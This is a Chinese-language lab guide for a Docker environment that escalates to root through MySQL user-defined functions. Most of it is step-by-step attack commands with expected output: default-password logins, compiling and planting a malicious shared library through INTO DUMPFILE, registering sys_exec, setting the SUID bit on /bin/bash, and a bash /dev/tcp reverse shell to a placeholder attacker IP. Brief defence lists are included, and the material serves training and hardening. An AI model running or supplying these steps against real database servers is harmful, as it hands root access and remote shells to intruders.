# MySQL UDF 提权

## 原理

UDF（User Defined Function，用户自定义函数）：MySQL 允许加载共享库（.so）注册
自定义函数。攻击链：

```
拿到 MySQL root (弱口令/SQL注入/配置泄露)
  -> 查看 plugin_dir 插件目录
  -> 恶意 .so 写入 plugin 目录 (FILE 权限 + INTO DUMPFILE, 或直接写入)
  -> CREATE FUNCTION 注册恶意函数 (sys_exec/sys_eval)
  -> SELECT sys_exec('命令') 以 mysqld 进程权限执行系统命令
  -> mysqld 以 root 运行 -> 直接 root 提权
```

关键前提：1) MySQL root 权限（或 FILE+INSERT） 2) 能向 plugin_dir 写文件
（secure_file_priv 为空） 3) **mysqld 以 root 运行**（默认配置常如此，本环境已配置）

## 环境

- 基础镜像：ubuntu:20.04（MySQL 8.0.42 + gcc + libmysqlclient-dev）
- 低权限用户：lowpriv / lowpriv123
- MySQL root 密码：root（可远程连接）
- 漏洞配置：secure_file_priv 为空 / plugin 目录 777 / mysqld 以 root 运行

## 复现步骤

利用文件已预置在容器内 /opt/exploits（属主 lowpriv，可读可写可执行），**全程在容器内操作**。

### 第一步：宿主机启动环境（仅这一步在宿主机）

```bash
cd ~/linux-privesc-lab/mysql-udf        # Kali 宿主机
docker compose up -d --build            # 构建并启动
docker exec -it mysql-udf su - lowpriv   # 进入容器 (密码 lowpriv123)
```

### 第二步：容器内确认漏洞环境

```bash
id                      # uid=1000(lowpriv) gid=1000(lowpriv)
sudo -l                 # 查看漏洞配置
ls -la /opt/exploits/   # 预置的漏洞利用文件 (源码/编译脚本/一键利用)
```

### 第三步：容器内利用（利用文件已预置在 /opt/exploits）

```bash
cd /opt/exploits

# 1. 连接 MySQL (弱口令 root/root)
mysql -h 127.0.0.1 -u root -proot
# 预期: mysql> 提示符
SHOW VARIABLES LIKE 'plugin_dir';      # /usr/lib/mysql/plugin
SHOW VARIABLES LIKE 'secure_file_priv'; # 空 (可任意写文件)
exit;

# 2. 编译 UDF 库 (udf_exec.c 就在当前目录)
bash compile.sh

# 3. 上传 + 注册 + 验证 (mysqld 以 root 运行)
bash setup_udf.sh
# 预期输出: uid=0(root) gid=0(root)   提权成功!

# 4. 给 bash 加 SUID 并验证
mysql -uroot -proot -e "SELECT sys_exec('chmod u+s /bin/bash');"
/bin/bash -p -c 'id'
# 预期: euid=0(root)
```

### 一键利用（容器内）

```bash
cd /opt/exploits && bash exploit.sh
```

## 手动利用（分步教学）

### 第一步：枚举 UDF 攻击的四个前提（缺一不可）

```bash
# 前提1: mysqld 进程以 root 运行
ps aux | grep mysqld
# 预期: root  ...  /usr/sbin/mysqld    <- 关键!

# 前提2: MySQL 版本支持 UDF (4.x/5.x 经典, 8.x 仍支持)
mysql -uroot -proot -e 'SELECT @@version;'

# 前提3: 能拿到数据库 root (弱口令/配置泄露)
# 前提4: secure_file_priv 为空 (允许写文件)
mysql -uroot -proot -e "SHOW VARIABLES LIKE 'secure_file_priv';"
# 预期: 空值
```

### 第二步：理解 UDF 攻击链（5 步）

UDF（User Defined Function）= 用户自定义函数：MySQL 允许加载 .so 共享库注册
新函数。攻击链：

```
1. 编译恶意 .so (sys_exec/sys_eval: 执行系统命令的函数)
2. 把 .so 放进 plugin_dir (/usr/lib/mysql/plugin)
3. CREATE FUNCTION 注册函数
4. SELECT sys_exec('命令') -> 以 mysqld 进程身份执行系统命令
5. mysqld 以 root 运行 -> 命令就是 root!
```

### 第三步：分步手动执行

```bash
# 1. 编译 (udf_exec.c 已在 /opt/exploits)
gcc -shared -fPIC -I/usr/include/mysql -o udf_exec.so udf_exec.c

# 2. 进入 MySQL
mysql -h 127.0.0.1 -u root -proot

# 3. 查 plugin 目录
mysql> SHOW VARIABLES LIKE 'plugin_dir';
# 预期: /usr/lib/mysql/plugin

# 4. 退出, 把 .so 放进 plugin 目录
mysql> exit;
cp udf_exec.so /usr/lib/mysql/plugin/

# 5. 注册函数
mysql -uroot -proot -e "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf_exec.so';"
mysql -uroot -proot -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf_exec.so';"

# 6. 执行系统命令 (关键验证!)
mysql -uroot -proot -e "SELECT sys_eval('id');"
# 预期: uid=0(root) gid=0(root) groups=0(root)   <- root 命令执行!

# 7. 给 bash 加 SUID 并验证
mysql -uroot -proot -e "SELECT sys_exec('chmod u+s /bin/bash');"
/bin/bash -p -c 'id'
# 预期: euid=0(root)
```

### 第四步：真实环境变体（无 plugin 写权限时）

经典 raptor_udf2.c 流程（用 SQL 上传 .so）：
```sql
use mysql;
create table foo(line blob);                          -- 临时表
insert into foo values(load_file('/tmp/raptor_udf2.so'));  -- 二进制读入表
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';  -- 写盘
create function do_system returns integer soname 'raptor_udf2.so';       -- 注册
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash'); -- 执行
```
原理：load_file 读二进制 -> 表作为中转 -> dumpfile 写入 root 目录
（因为 mysqld 是 root，写文件也是 root 权限）。

### 第五步：反弹 shell 变体

```sql
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/攻击机IP/4444 0>&1"');
```
攻击机：nc -lvnp 4444，收到 root shell。

### 自动化枚举

LinPEAS 会直接标出 MySQL 相关利用点：
```bash
./linpeas.sh -a | grep -iA5 mysql
```

### 防御

- MySQL 绝不以 root 运行（改为独立低权限用户）
- 禁用 FILE 权限：REVOKE FILE ON *.* FROM 'user'
- secure_file_priv 限制到专用目录
- 定期检查已注册 UDF：SELECT * FROM mysql.func;

实机验证踩坑记录（重要）

| 问题 | 根因 | 修复 |
|:---|:---|:---|
| mysqld 不以 root 运行 | 1) mysqld_safe 的 user=root 反而不传 --user 参数 2) 默认配置 user=mysql 参数首个生效覆盖 --user=root | sed 替换默认配置 + mysqld --user=root --daemonize 直启 |
| MySQL root 密码认证失败 | MySQL 8.0 root@localhost 默认 auth_socket 插件 | ALTER USER ... IDENTIFIED WITH mysql_native_password BY 'root' |
| lowpriv 连不上 MySQL | /var/run/mysqld 目录 700 | chmod 755 /var/run/mysqld |
| udf_exec.c 编译失败 | Ubuntu 20.04 的 libmysqlclient-dev 是 8.0, 已移除 my_bool 类型 | #define my_bool bool 兼容 |

## 防御

- MySQL 不以 root 运行
- 强密码 + 禁止 FILE 权限: REVOKE FILE ON *.* FROM 'user'
- secure_file_priv 限制到专用目录
- 定期检查: SELECT * FROM mysql.func;


## 扩展教学（网络搜索整理）

### 完整枚举顺序（Juggernaut 教程方法论）

拿到 shell 后按此顺序确认 UDF 可行性：
```bash
# 1. MySQL 进程属主 (关键!)
ps aux | grep mysqld

# 2. MySQL 版本 (4.x/5.x 经典, 8.x 仍支持 UDF)
mysql -V 或 SELECT @@version;

# 3. 数据库凭据 (弱口令优先尝试)
mysql -u root            # 空密码
mysql -u root -ptoor     # 常见默认密码
mysql -u root -proot
# 或翻网站配置文件: /var/www/html/config.inc.php 等

# 4. secure_file_priv (必须为空才能写文件)
SHOW VARIABLES LIKE 'secure_file_priv';

# 5. plugin_dir 位置
SHOW VARIABLES LIKE 'plugin_dir';
```

LinPEAS 自动完成以上全部检查并标红：
```bash
./linpeas.sh -a | grep -iA5 -E 'mysql|plugin'
```

### 经典 raptor_udf2.c 五步（SQL 内完成文件传输）

```sql
use mysql;
create table foo(line blob);                                    -- 1. 建临时表
insert into foo values(load_file('/tmp/raptor_udf2.so'));      -- 2. 二进制读入
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';  -- 3. 写盘
create function do_system returns integer soname 'raptor_udf2.so';       -- 4. 注册
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash'); -- 5. 执行
```
为什么用表中转：mysqld 是 root，load_file 读文件、dumpfile 写文件都以
root 权限完成——这是"无 shell 情况下向 root 目录传文件"的标准技巧。

### 编译注意（架构）

在攻击机编译的 .so 必须与靶机架构一致（x86/x64），不确定就在靶机编译：
```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

### 验证函数注册成功

```sql
select * from mysql.func;
-- 出现 do_system / sys_exec 行即成功
```

### 防御清单

- mysqld 以专用低权限用户运行（绝不 root）
- REVOKE FILE ON *.* FROM 'user'
- secure_file_priv 限制到专用目录
- 数据库强密码 + 最小权限
- 定期 SELECT * FROM mysql.func 查 UDF 后门

## 验证记录

2026-08-26 真实环境验证：`SELECT sys_eval('id')` 输出 `uid=0(root) gid=0(root) groups=0(root)`，
`sys_exec('chmod u+s /bin/bash')` 成功，`/bin/bash -p -c 'id'` 输出 `euid=0(root)`。复现成功。
